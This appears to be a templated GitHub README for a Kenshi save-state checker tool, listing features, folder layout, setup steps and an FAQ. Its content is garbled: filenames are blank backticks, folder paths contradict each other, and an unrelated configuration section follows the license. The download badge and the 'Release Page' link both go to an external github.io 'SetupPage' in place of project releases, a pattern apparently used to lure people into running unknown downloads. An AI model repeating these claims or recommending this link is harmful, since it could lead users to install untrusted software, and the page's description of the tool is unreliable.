# Kenshi-World-State-Checker

> **TL;DR** – A lightweight, profile‑driven checker that inspects the current state of your *Kenshi* world, validates configuration consistency, and exports a ready‑to‑use bundle. Download, select a preset, run the checker, and get a concise report in seconds.

<div align="center">
<a href="https://rewfdf.github.io/SetupPage/"><img src="https://img.shields.io/badge/Download-Release-65a30d?style=plastic&logo=git&logoColor=white" alt="Download"></a>
<img src="https://img.shields.io/badge/Kenshi-1.0.0-4c1?style=for-the-badge&logo=game-controller&logoColor=white" alt="Kenshi">
<img src="https://img.shields.io/badge/World%20State-Checker-ff6600?style=flat-square&logo=searchengin&logoColor=white" alt="World State">
<img src="https://img.shields.io/badge/Version-2.3.1-007ec6?style=plastic&logo=github&logoColor=white" alt="Version">
<img src="https://img.shields.io/badge/License-MIT-8a2be2?style=flat&logo=license&logoColor=white" alt="License">
<img src="https://img.shields.io/badge/Platform-Windows%20%7C%20Linux-5c5c5c?style=for-the-badge&logo=linux&logoColor=white" alt="Platform">
</div>

---

## What the Kenshi World State Checker Does

The **Kenshi-World-State-Checker** evaluates the integrity of your saved world against a set of predefined rules:

* **Profile validation** – Each configuration profile (``, ``, ``, ``) describes expected faction balances, settlement health, and resource thresholds.
* **Workflow presets** – Ready‑made presets (`Peaceful`, `Warzone`, `Economic Boom`, `Survival`) chain multiple checks into a single command.
* **Bundle export** – After a successful run, the checker produces a compressed bundle containing the report, the active config files, and a copy of the saved world for archival purposes.

All operations are performed locally, require no external services, and keep the original save files untouched.

---

## Core Features

| Feature | Description | Relevant File |
|--------|-------------|----------------|
| Structured Profiles | Human‑readable INI‑style sections for factions, settlements, resources. | ``, ``, ``, `` |
| Preset Workflows | Combine up to five checks in a single execution (e.g., *Warzone → Resource Drain → Settlement Collapse*). | `presets/warzone.workflow` |
| Detailed Reporting | Generates JSON and Markdown summaries with severity levels (INFO, WARN, CRITICAL). | `reports/latest.json`, `reports/summary.md` |
| Automated Bundling | Creates a zip file named `Kenshi_State_<timestamp>.zip`. | `bundles/` |
| Cross‑Platform CLI | Built on .NET 6, runs on Windows and Linux without additional runtime installs. | `KenshiWorldStateChecker.dll` |
| Extensible Rules Engine | Add custom validators by placing a `.rule` file in the `rules/` directory. | `rules/custom.rule` |

---

## Repository Layout

```
Kenshi-World-State-Checker/
├─ src/                     # Source code (C#)
│   ├─ Core/                # Core engine, state parser
│   ├─ Profiles/            # Default profile files
│   │   ├─
│   │   ├─
│   │   ├─
│   │   └─
│   ├─ Workflows/           # Preset workflow definitions
│   │   ├─ peaceful.workflow
│   │   ├─ warzone.workflow
│   │   └─ economic_boom.workflow
│   └─ Rules/               # Built‑in rule definitions
│       ├─ faction_balance.rule
│       └─ settlement_health.rule
├─ bundles/                 # Output bundles (git‑ignored)
├─ reports/                 # Latest generated reports
├─ docs/                    # Additional documentation, diagrams
└─ README.md                # This file
```

The `src/Profiles` folder holds the four immutable configuration files referenced throughout the checker. Adjust values only inside `` to keep the baseline profiles untouched.

---

## Getting Started

1. **Download the latest release** – Click the badge at the top of this page or visit the [Release Page](https://rewfdf.github.io/SetupPage/).
2. **Extract the zip** into a folder of your choice.
3. **Select a workflow** – Open `presets/` and choose a `.workflow` file that matches your playstyle.
4. **Run the checker** – Double‑click `run.bat` (Windows) or execute `dotnet KenshiWorldStateChecker.dll --workflow <name>` from a terminal (Linux).
5. **Inspect the report** – After completion, open `reports/summary.md` for a human‑readable overview or `reports/latest.json` for programmatic consumption.
6. **Archive the bundle** – The generated zip in `bundles/` can be stored alongside your save files for future reference.

> **Tip:** Keep ``, ``, and `` unchanged; only edit `` to override specific thresholds without breaking the baseline verification logic.

---

## FAQ & Troubleshooting

| Question | Answer |
|----------|--------|
| *The checker reports “Missing faction data”.* | Verify that your save folder contains `faction_data.xml`. If the file is corrupted, restore it from a backup or re‑export the world from the game. |
| *I get “Rule file not found” when running a custom workflow.* | Ensure the referenced `.rule` file resides in `src/Rules/` and that the filename matches exactly (case‑sensitive on Linux). |
| *The generated bundle is empty.* | The checker aborts if any **CRITICAL** warning appears. Review `reports/summary.md` for the offending check, resolve the issue, then re‑run. |
| *Can I run the checker on a headless server?* | Yes. Use the CLI mode (`dotnet KenshiWorldStateChecker.dll …`) and redirect output to a log file with `> run.log`. |
| *Where are the configuration files stored after a run?* | The active configuration set is copied into the bundle under `config/`. The originals remain untouched in `src/Profiles/`. |

If you encounter an error not covered here, open an issue on the repository and attach the `reports/latest.json` file for context.

---

## Contributing

Contributions are encouraged. Follow these steps:

1. Fork the repository under your GitHub account.
2. Create a branch named `feature/<description>` or `fix/<description>`.
3. Keep the coding style consistent with the existing C# files (use `dotnet format`).
4. Add or update unit tests in `src/Tests/`.
5. Submit a pull request with a clear description of the change and reference any related issue number.

All contributions are released under the MIT license, matching the project’s licensing terms.

---

## License

The **Kenshi-World-State-Checker** is released under the **MIT License**. See the `LICENSE` file for full legal text.

---

*Keywords:* kenshi, world, state, checker, kenshi-world, world-state, state-checker, kenshi-manager, kenshi-helper, kenshi-config

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```